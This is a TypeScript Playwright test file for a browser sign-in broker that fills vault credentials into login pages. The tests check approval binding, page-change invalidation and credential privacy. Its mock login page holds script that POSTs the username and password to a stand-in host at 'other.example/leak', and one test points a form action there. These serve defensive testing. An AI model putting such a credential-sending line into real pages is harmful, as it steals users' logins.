import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import * as path from 'node:path'
import type { Page } from 'playwright'
import { matchesLoginOrigin } from '#lib/credentials/login.ts'
import { SensitiveValue } from '#lib/credentials/SensitiveValue.ts'
import { assert, test } from '#test'
import { SignInBroker, type SignInBrokerOptions } from './broker.ts'
import { PrivateBrowserSession } from './session.ts'

const USERNAME = 'jane@example.com'
const PASSWORD = 'mock-Atlas-scripted-password'
const LOGIN = `<label>Login ID<input id="username" aria-label="Login ID"></label>
<label>Password<input id="password" type="password" autocomplete="off"></label>
<button type="submit" disabled>Log in</button><script>
const button = document.querySelector('button');
document.addEventListener('input', () => button.disabled = !username.value || !password.value);
button.onclick = async () => {
  const body = new URLSearchParams({ username: username.value, password: password.value });
  await fetch('https://other.example/leak', { method: 'POST', body }).catch(() => {});
  await fetch('/session', { method: 'POST', body });
  document.body.innerHTML = '<h1>Signed in</h1>';
};</script>`

async function fixture(
  work: (f: {
    browser: PrivateBrowserSession
    page: Page
    counts: { read: number; submitted: number; escaped: number }
    options: SignInBrokerOptions
  }) => Promise<void>,
  frameOrigin = 'https://login.atlas.example',
) {
  const root = await mkdtemp(path.join(tmpdir(), 'sky-scripted-login-test-'))
  let page!: Page
  const counts = { read: 0, submitted: 0, escaped: 0 }
  const item = {
    ref: { connectionId: 'mock', containerId: 'vault', itemId: 'login' },
    title: 'Atlas',
    nativeCategory: 'Login',
    tags: [],
    websites: [{ url: 'www.atlas.example', match: 'subdomains' as const }],
  }
  const options: SignInBrokerOptions = {
    sources: async () => [{ id: 'mock', account: 'account', label: 'Mock', excludedVaultIds: [] }],
    connect: async () => ({
      list: async () => ({ items: [item], issues: [] }),
      readLogin: async () => {
        counts.read++
        return {
          username: new SensitiveValue(USERNAME),
          password: new SensitiveValue(PASSWORD),
          permitsOrigin: (origin) => matchesLoginOrigin(item, origin),
        }
      },
    }),
    approval: { allowLookup: async () => true, choose: async () => 0 },
  }
  const browser = await PrivateBrowserSession.launch({
    filesDir: path.join(root, 'files'),
    profileDir: path.join(root, 'profile'),
    headless: true,
    broker: new SignInBroker(options),
    prepare: async (created) => {
      page = created
      await page.context().route('**/*', async (route) => {
        const request = route.request()
        const url = new URL(request.url())
        if (url.hostname === 'other.example' && url.pathname === '/leak') counts.escaped++
        if (request.method() === 'POST' && url.pathname === '/session') {
          const body = new URLSearchParams(request.postData() ?? '')
          if (body.get('username') === USERNAME && body.get('password') === PASSWORD) counts.submitted++
        }
        await route.fulfill({
          contentType: 'text/html',
          headers: { 'Access-Control-Allow-Origin': request.headers().origin ?? '*' },
          body:
            url.hostname === 'www.atlas.example'
              ? `<iframe title="Sign in" src="${frameOrigin}/login"></iframe>`
              : LOGIN,
        })
      })
    },
  })
  try {
    await browser.callTool('browser_navigate', { url: 'https://www.atlas.example/login' })
    await page.frameLocator('iframe').getByRole('button', { name: 'Log in' }).waitFor()
    await work({ browser, page, counts, options })
  } finally {
    await browser.close()
    await rm(root, { recursive: true, force: true })
  }
}

test(
  'a same-website embedded JavaScript login uses approved credentials without exposing them',
  { timeout: 30000 },
  async () =>
    fixture(async (f) => {
      const signed = await f.browser.callTool('sign_in', {})
      await f.page.frameLocator('iframe').getByRole('heading', { name: 'Signed in' }).waitFor()
      const snapshot = await f.browser.callTool('browser_snapshot', { boxes: true })
      assert({
        given: 'a labelled login without an HTML form inside a same-website frame',
        should: 'bind approval to that document, fill privately, and block credential delivery elsewhere',
        actual: [
          JSON.stringify(signed).includes('submitted'),
          f.counts,
          JSON.stringify([signed, snapshot]).includes(PASSWORD),
          JSON.stringify([signed, snapshot]).includes(USERNAME),
        ],
        expected: [true, { read: 1, submitted: 1, escaped: 0 }, false, false],
      })
    }),
)

test('a JavaScript HTML form can post privately to its saved website API', { timeout: 30000 }, async () =>
  fixture(async (f) => {
    await f.page.goto('https://login.atlas.example/login')
    await f.page.evaluate(() => {
      const form = document.createElement('form')
      document.body.append(form)
      for (const control of document.querySelectorAll('input,button')) form.append(control)
      const button = form.querySelector('button')!
      button.onclick = null
      form.onsubmit = async (event) => {
        event.preventDefault()
        const body = new URLSearchParams({
          username: form.querySelector<HTMLInputElement>('#username')!.value,
          password: form.querySelector<HTMLInputElement>('#password')!.value,
        })
        await fetch('https://api.atlas.example/session', { method: 'POST', body })
        document.body.innerHTML = '<h1>Signed in</h1>'
      }
    })
    const signed = await f.browser.callTool('sign_in', {})
    await f.page.getByRole('heading', { name: 'Signed in' }).waitFor()
    const snapshot = await f.browser.callTool('browser_snapshot', {})
    assert({
      given: 'a JavaScript HTML form and a scheme-less saved website permitting its API subdomain',
      should: 'use 1Password, run the submit handler, and keep the credentials private',
      actual: [
        JSON.stringify(signed).includes('submitted'),
        f.counts,
        JSON.stringify([signed, snapshot]).includes(PASSWORD),
        JSON.stringify([signed, snapshot]).includes(USERNAME),
        new URL(f.page.url()).search,
      ],
      expected: [true, { read: 1, submitted: 1, escaped: 0 }, false, false, ''],
    })
  }),
)

test('a missing JavaScript handler cannot fall back to a credential GET', { timeout: 30000 }, async () =>
  fixture(async (f) => {
    await f.page.goto('https://login.atlas.example/login')
    await f.page.evaluate(() => {
      const form = document.createElement('form')
      document.body.append(form)
      for (const control of document.querySelectorAll('input,button')) form.append(control)
      form.querySelector('button')!.onclick = null
      for (const field of form.querySelectorAll('input')) field.name = field.id
    })
    await f.browser.callTool('sign_in', {})
    assert({
      given: 'a form with no action, method, or functioning submit handler',
      should: 'suppress its native GET submission so credentials never reach the URL',
      actual: [f.page.url(), f.counts],
      expected: ['https://login.atlas.example/login', { read: 1, submitted: 0, escaped: 0 }],
    })
  }),
)

test('embedded sign-in rejects another website before requesting any credential', { timeout: 30000 }, async () =>
  fixture(async (f) => {
    const signed = await f.browser.callTool('sign_in', {})
    assert({
      given: 'a visible login belonging to an unrelated embedded website',
      should: 'leave authentication to the person without reading or submitting a login',
      actual: [JSON.stringify(signed).includes('needs_user'), f.counts],
      expected: [true, { read: 0, submitted: 0, escaped: 0 }],
    })
  }, 'https://other.example'),
)

test('hidden, ambiguous and registration controls cannot authorize a scripted login', { timeout: 30000 }, async () => {
  for (const condition of ['hidden', 'ambiguous', 'registration', 'get-form', 'action', 'target'] as const) {
    await fixture(async (f) => {
      if (condition === 'hidden')
        await f.page.locator('iframe').evaluate((frame) => {
          frame.style.display = 'none'
        })
      else
        await f.page
          .frameLocator('iframe')
          .locator('input[type=password]')
          .evaluate((password, condition) => {
            if (condition === 'ambiguous') password.after(password.cloneNode(true))
            else if (condition === 'registration') password.setAttribute('autocomplete', 'new-password')
            else {
              const form = document.createElement('form')
              if (condition === 'get-form') form.method = 'get'
              else if (condition === 'action') form.action = 'https://other.example/leak'
              else form.target = '_blank'
              document.body.append(form)
              for (const control of document.querySelectorAll('input,button')) form.append(control)
            }
          }, condition)
      await f.browser.callTool('sign_in', {})
      assert({
        given: `${condition} credential controls`,
        should: 'decline automatic filling without reading any password',
        actual: f.counts,
        expected: { read: 0, submitted: 0, escaped: 0 },
      })
    })
  }
})

test('an embedded login replaced during approval cannot inherit the captured target', { timeout: 30000 }, async () =>
  fixture(async (f) => {
    f.options.approval.choose = async () => {
      await f.page
        .frameLocator('iframe')
        .locator('input[type=password]')
        .evaluate((field) => field.replaceWith(field.cloneNode(true)))
      return 0
    }
    const signed = await f.browser.callTool('sign_in', {})
    assert({
      given: 'the login controls were replaced while native selection was open',
      should: 'invalidate the target before reading a password',
      actual: [JSON.stringify(signed).includes('page_changed'), f.counts],
      expected: [true, { read: 0, submitted: 0, escaped: 0 }],
    })
  }),
)

test('a scripted HTML form changed during approval invalidates its captured controls', { timeout: 30000 }, async () =>
  fixture(async (f) => {
    await f.page.goto('https://login.atlas.example/login')
    await f.page.evaluate(() => {
      const form = document.createElement('form')
      document.body.append(form)
      for (const control of document.querySelectorAll('input,button')) form.append(control)
    })
    f.options.approval.choose = async () => {
      await f.page.locator('form').evaluate((form) => {
        const replacement = document.createElement('form')
        while (form.firstChild) replacement.append(form.firstChild)
        form.replaceWith(replacement)
      })
      return 0
    }
    const signed = await f.browser.callTool('sign_in', {})
    assert({
      given: 'the same login controls moved into a replacement HTML form during approval',
      should: 'stop before reading credentials even when the replacement has identical attributes',
      actual: [JSON.stringify(signed).includes('page_changed'), f.counts],
      expected: [true, { read: 0, submitted: 0, escaped: 0 }],
    })
  }),
)
